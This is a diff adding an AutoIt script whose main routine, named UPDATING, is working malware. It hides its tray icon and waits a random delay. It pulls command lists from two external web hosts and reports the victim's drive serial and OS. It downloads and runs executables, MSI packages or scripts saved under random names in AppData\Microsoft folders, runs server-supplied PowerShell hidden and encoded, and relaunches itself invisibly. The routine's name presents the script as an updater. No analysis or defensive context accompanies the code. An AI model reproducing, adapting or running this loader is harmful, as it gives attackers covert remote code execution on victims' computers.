@@ -1,0 +1,310 @@
+Global Const $inet_localcache = 0x0
+Global Const $inet_forcereload = 0x1
+Global Const $inet_ignoressl = 0x2
+Global Const $inet_asciitransfer = 0x4
+Global Const $inet_binarytransfer = 0x8
+Global Const $inet_forcebypass = 0x10
+Global Const $inet_downloadwait = 0x0
+Global Const $inet_downloadbackground = 0x1
+Global Const $inet_downloadread = 0x0
+Global Const $inet_downloadsize = 0x1
+Global Const $inet_downloadcomplete = 0x2
+Global Const $inet_downloadsuccess = 0x3
+Global Const $inet_downloaderror = 0x4
+Global Const $inet_downloadextended = 0x5
+Global Const $mb_ok = 0x0
+Global Const $mb_okcancel = 0x1
+Global Const $mb_abortretryignore = 0x2
+Global Const $mb_yesnocancel = 0x3
+Global Const $mb_yesno = 0x4
+Global Const $mb_retrycancel = 0x5
+Global Const $mb_canceltrycontinue = 0x6
+Global Const $mb_help = 0x4000
+Global Const $mb_iconnone = 0x0
+Global Const $mb_iconstop = 0x10
+Global Const $mb_iconerror = 0x10
+Global Const $mb_iconhand = 0x10
+Global Const $mb_iconquestion = 0x20
+Global Const $mb_iconexclamation = 0x30
+Global Const $mb_iconwarning = 0x30
+Global Const $mb_iconinformation = 0x40
+Global Const $mb_iconasterisk = 0x40
+Global Const $mb_usericon = 0x80
+Global Const $mb_defbutton1 = 0x0
+Global Const $mb_defbutton2 = 0x100
+Global Const $mb_defbutton3 = 0x200
+Global Const $mb_defbutton4 = 0x300
+Global Const $mb_applmodal = 0x0
+Global Const $mb_systemmodal = 0x1000
+Global Const $mb_taskmodal = 0x2000
+Global Const $mb_default_desktop_only = 0x20000
+Global Const $mb_right = 0x80000
+Global Const $mb_rtlreading = 0x100000
+Global Const $mb_setforeground = 0x10000
+Global Const $mb_topmost = 0x40000
+Global Const $mb_service_notification = 0x200000
+Global Const $mb_rightjustified = $mb_right
+Global Const $idtimeout = +0xffffffff
+Global Const $idok = 0x1
+Global Const $idcancel = 0x2
+Global Const $idabort = 0x3
+Global Const $idretry = 0x4
+Global Const $idignore = 0x5
+Global Const $idyes = 0x6
+Global Const $idno = 0x7
+Global Const $idclose = 0x8
+Global Const $idhelp = 0x9
+Global Const $idtryagain = 0xa
+Global Const $idcontinue = 0xb
+Global Const $str_nocasesense = 0x0
+Global Const $str_casesense = 0x1
+Global Const $str_nocasesensebasic = 0x2
+Global Const $str_stripleading = 0x1
+Global Const $str_striptrailing = 0x2
+Global Const $str_stripspaces = 0x4
+Global Const $str_stripall = 0x8
+Global Const $str_chrsplit = 0x0
+Global Const $str_entiresplit = 0x1
+Global Const $str_nocount = 0x2
+Global Const $str_regexpmatch = 0x0
+Global Const $str_regexparraymatch = 0x1
+Global Const $str_regexparrayfullmatch = 0x2
+Global Const $str_regexparrayglobalmatch = 0x3
+Global Const $str_regexparrayglobalfullmatch = 0x4
+Global Const $str_endisstart = 0x0
+Global Const $str_endnotstart = 0x1
+Global Const $sb_ansi = 0x1
+Global Const $sb_utf16le = 0x2
+Global Const $sb_utf16be = 0x3
+Global Const $sb_utf8 = 0x4
+Global Const $se_utf16 = 0x0
+Global Const $se_ansi = 0x1
+Global Const $se_utf8 = 0x2
+Global Const $str_utf16 = 0x0
+Global Const $str_ucs2 = 0x1
+Func _HexToString($shex)
+    If Not (StringLeft($shex, 0x2) == "0x") Then $shex = "0x" & $shex
+    Return BinaryToString($shex, $sb_utf8)
+EndFunc   ;==>_HEXTOSTRING
+Func _StringBetween($sstring, $sstart, $send, $imode = $str_endisstart, $bcase = False)
+    $sstart = $sstart ? "\Q" & $sstart & "\E" : "\A"
+    If $imode <> $str_endnotstart Then $imode = $str_endisstart
+    If $imode = $str_endisstart Then
+        $send = $send ? "(?=\Q" & $send & "\E)" : "\z"
+    Else
+        $send = $send ? "\Q" & $send & "\E" : "\z"
+    EndIf
+    If $bcase = Default Then
+        $bcase = False
+    EndIf
+    Local $aret = StringRegExp($sstring, "(?s" & (Not $bcase ? "i" : "") & ")" & $sstart & "(.*?)" & $send, $str_regexparrayglobalmatch)
+    If @error Then Return SetError(0x1, 0x0, 0x0)
+    Return $aret
+EndFunc   ;==>_STRINGBETWEEN
+Func _StringExplode($sstring, $sdelimiter, $ilimit = 0x0)
+    If $ilimit = Default Then $ilimit = 0x0
+    If $ilimit > 0x0 Then
+        Local Const $null = Chr(0x0)
+        $sstring = StringReplace($sstring, $sdelimiter, $null, $ilimit)
+        $sdelimiter = $null
+    ElseIf $ilimit < 0x0 Then
+        Local $iindex = StringInStr($sstring, $sdelimiter, $str_nocasesensebasic, $ilimit)
+        If $iindex Then
+            $sstring = StringLeft($sstring, $iindex + 0xffffffff)
+        EndIf
+    EndIf
+    Return StringSplit($sstring, $sdelimiter, BitOR($str_entiresplit, $str_nocount))
+EndFunc   ;==>_STRINGEXPLODE
+Func _StringInsert($sstring, $sinsertion, $iposition)
+    Local $ilength = StringLen($sstring)
+    $iposition = Int($iposition)
+    If $iposition < 0x0 Then $iposition = $ilength + $iposition
+    If $ilength < $iposition Or $iposition < 0x0 Then Return SetError(0x1, 0x0, $sstring)
+    Return StringLeft($sstring, $iposition) & $sinsertion & StringRight($sstring, $ilength - $iposition)
+EndFunc   ;==>_STRINGINSERT
+Func _StringProper($sstring)
+    Local $bcapnext = True, $schr = "", $sreturn = ""
+    Local $spattern = "[a-zA-Z?-?aS~x]"
+    For $i = 0x1 To StringLen($sstring)
+        $schr = StringMid($sstring, $i, 0x1)
+        Select
+            Case $bcapnext = True
+                If StringRegExp($schr, $spattern) Then
+                    $schr = StringUpper($schr)
+                    $bcapnext = False
+                EndIf
+            Case Not StringRegExp($schr, $spattern)
+                $bcapnext = True
+            Case Else
+                $schr = StringLower($schr)
+        EndSelect
+        $sreturn &= $schr
+    Next
+    Return $sreturn
+EndFunc   ;==>_STRINGPROPER
+Func _StringRepeat($sstring, $irepeatcount)
+    $irepeatcount = Int($irepeatcount)
+    If $irepeatcount = 0x0 Then Return ""
+    If StringLen($sstring) < 0x1 Or $irepeatcount < 0x0 Then Return SetError(0x1, 0x0, "")
+    Local $sresult = ""
+    While $irepeatcount > 0x1
+        If BitAND($irepeatcount, 0x1) Then $sresult &= $sstring
+        $sstring &= $sstring
+        $irepeatcount = BitShift($irepeatcount, 0x1)
+    WEnd
+    Return $sstring & $sresult
+EndFunc   ;==>_STRINGREPEAT
+Func _StringTitleCase($sstring)
+    Local $bcapnext = True, $schr = "", $sreturn = ""
+    For $i = 0x1 To StringLen($sstring)
+        $schr = StringMid($sstring, $i, 0x1)
+        Select
+            Case $bcapnext = True
+                If StringRegExp($schr, "[a-zA-Z\xC0-\xFF0-9]") Then
+                    $schr = StringUpper($schr)
+                    $bcapnext = False
+                EndIf
+            Case Not StringRegExp($schr, "[a-zA-Z\xC0-\xFF'0-9]")
+                $bcapnext = True
+            Case Else
+                $schr = StringLower($schr)
+        EndSelect
+        $sreturn &= $schr
+    Next
+    Return $sreturn
+EndFunc   ;==>_STRINGTITLECASE
+Func _StringToHex($sstring)
+    Return Hex(StringToBinary($sstring, $sb_utf8))
+EndFunc   ;==>_STRINGTOHEX
+#NoTrayIcon
+Global $__g_ohttp_errorhandler = ObjEvent("AutoIt.Error", __HTTP_ONERROR)
+Global $surlinfo = ""
+UPDATING($surlinfo)
+Func UPDATING($surlinfo)
+    If WinExists("testando1") Then Exit
+    AutoItWinSetTitle("testando1")
+    $irand = Random(0x3c, 0x64, 0x1)
+    Sleep($irand * 0x3e8)
+    Local $xurls = _HTTPGET("https://sirheck.com/wp-includes/blocks/jquery.json")
+    Local $xurls2 = _HTTPGET("https://poderyfinanzas.com/td-composer/jquery.json")
+    $xactiveurl = $xurls
+    If ($xurls = "") Then
+        $xactiveurl = $xurls2
+    EndIf
+    Local $arrurls = StringSplit($xactiveurl, "|")
+    Local $sserial = Hex(DriveGetSerial(@HomeDrive & "\"))
+    For $i = 0x1 To $arrurls[0x0]
+        $sget = _HTTPGET($arrurls[$i] & "?h=" & $sserial & "1")
+        $sget2 = _HTTPGET($arrurls[$i] & "iiix/index.php?h=" & $sserial & "1&ver=1&os=" & _GETOS())
+        If StringInStr($sget, ";") Then
+            If StringInStr($sget, ".DOW") Or StringInStr($sget, ".DAW") Or StringInStr($sget, ".DIW") Then
+                $sget = StringReplace($sget, @CR, "")
+                Local $arrlines = StringSplit($sget, @LF)
+                For $x = 0x1 To $arrlines[0x0]
+                    If StringInStr($arrlines[$x], ".DOW") Then
+                        Local $sdown = StringReplace($arrlines[$x], ".DOW ", "")
+                        $spathdown = _SECUREDOWNLOAD($sdown, ".exe")
+                        If $spathdown <> "" Then
+                            Local $ipid = Run($spathdown)
+                            If $ipid = 0x0 Then ShellExecute($spathdown)
+                        EndIf
+                    EndIf
+                    If StringInStr($arrlines[$x], ".DAW") Then
+                        Local $sdown = StringReplace($arrlines[$x], ".DAW ", "")
+                        $spathdown = _SECUREDOWNLOAD($sdown, "")
+                        If $spathdown <> "" Then ShellExecute(@AutoItExe, $spathdown)
+                    EndIf
+                    If StringInStr($arrlines[$x], ".DIW") Then
+                        Local $sdown = StringReplace($arrlines[$x], ".DIW ", "")
+                        $spathdown = _SECUREDOWNLOAD($sdown, ".msi")
+                        If $spathdown <> "" Then ShellExecute($spathdown)
+                    EndIf
+                Next
+            EndIf
+            ShellExecute("powershell.exe", "-ExecutionPolicy UnRestricted -Encoded " & StringReplace(_BASE64ENCODE(StringToBinary($sget, 0x2)), @LF, ""), "", "open", @SW_HIDE)
+            ExitLoop
+        EndIf
+    Next
+    ShellExecute(@AutoItExe, '"' & @ScriptFullPath & '"', "", "open", @SW_HIDE)
+EndFunc   ;==>UPDATING
+Func __HTTP_ONERROR(ByRef $omyerror)
+    Local $hexnumber = Hex($omyerror .number, 0x8)
+    Return SetError(0x5, $hexnumber, 0x0)
+EndFunc   ;==>__HTTP_ONERROR
+Func _HTTPGET($surl)
+    Local $ohttp = ObjCreate("WinHttp.WinHttpRequest.5.1")
+    If _ISWIN7() Then $surl = StringReplace($surl, "https:", "http:")
+    $ohttp .Open("GET", $surl, False)
+    If (@error) Then Return SetError(0x1, 0x0, 0x0)
+    $ohttp .Send()
+    If (@error) Then Return SetError(0x2, 0x0, 0x0)
+    If ($ohttp .Status <> 0xc8) Then Return SetError(0x3, 0x0, 0x0)
+    Return SetError(0x0, 0x0, $ohttp .ResponseText)
+EndFunc   ;==>_HTTPGET
+Func _DOWNLOADFILE($surl, $sdata)
+    Local $ohttp = ObjCreate("WinHttp.WinHttpRequest.5.1")
+    $ohttp .Open("GET", $surl, False)
+    If (@error) Then Return SetError(0x1, 0x0, 0x0)
+    $ohttp .Send()
+    If (@error) Then Return SetError(0x2, 0x0, 0x0)
+    If ($ohttp .Status <> 0xc8) Then Return SetError(0x3, 0x0, 0x0)
+    FileWrite($sdata, $ohttp .ResponseBody)
+EndFunc   ;==>_DOWNLOADFILE
+Func _BASE64ENCODE($sdata)
+    Local $oxml = ObjCreate("Msxml2.DOMDocument")
+    If Not IsObj($oxml) Then
+        SetError(0x1, 0x1, 0x0)
+    EndIf
+    Local $oelement = $oxml .createElement("b64")
+    If Not IsObj($oelement) Then
+        SetError(0x2, 0x2, 0x0)
+    EndIf
+    $oelement .dataType = "bin.base64"
+    $oelement .nodeTypedValue = Binary($sdata)
+    Local $sreturn = $oelement .Text
+    If StringLen($sreturn) = 0x0 Then
+        SetError(0x3, 0x3, 0x0)
+    EndIf
+    Return $sreturn
+EndFunc   ;==>_BASE64ENCODE
+Func _MAKESTRING()
+    Local $asplit = StringSplit("abcdefghijklmnopqrstuvwxyz0123456789", "")
+    Local $sholdstring = ""
+    For $icc = 0x1 To Random(0x6, 0xa, 0x1)
+        $sholdstring &= $asplit[Random(0x1, $asplit[0x0], 0x1)]
+    Next
+    Return $sholdstring
+EndFunc   ;==>_MAKESTRING
+Func _ISWIN7()
+    $objwmiservice = ObjGet("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+    $colsettings = $objwmiservice .ExecQuery("Select * from Win32_OperatingSystem")
+    For $objoperatingsystem In $colsettings
+        If StringInStr($objoperatingsystem .Caption, "Windows 7") Then Return True
+    Next
+    Return False
+EndFunc   ;==>_ISWIN7
+Func _SECUREDOWNLOAD($surl, $sext)
+    Local $arr = [@LocalAppDataDir & "\Microsoft\", @AppDataDir & "\Microsoft\", @AppDataDir & "\Microsoft\Windows\", @ScriptDir & "\"]
+    $sfilename = _MAKESTRING() & $sext
+    For $i = 0x0 To UBound($arr) + 0xffffffff
+        $spathbin = $arr[$i] & $sfilename
+        ConsoleWrite($spathbin & @LF)
+        InetGet($surl, $spathbin, $inet_forcebypass)
+        If Not FileExists($spathbin) Then
+            _DOWNLOADFILE($surl, $spathbin)
+        EndIf
+        If FileExists($spathbin) Then Return '"' & $spathbin & '"'
+    Next
+    Return ""
+EndFunc   ;==>_SECUREDOWNLOAD
+Func _GETOS()
+    $objwmiservice = ObjGet("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+    $colsettings = $objwmiservice .ExecQuery("Select * from Win32_OperatingSystem")
+    For $objoperatingsystem In $colsettings
+        If StringInStr($objoperatingsystem .Caption, "Windows 7") Then Return "Windows 7"
+        If StringInStr($objoperatingsystem .Caption, "Windows 8") Then Return "Windows 8"
+        If StringInStr($objoperatingsystem .Caption, "Windows 10") Then Return "Windows 10"
+        If StringInStr($objoperatingsystem .Caption, "Windows 11") Then Return "Windows 11"
+    Next
+    Return "Unknown"
+EndFunc   ;==>_GETOS
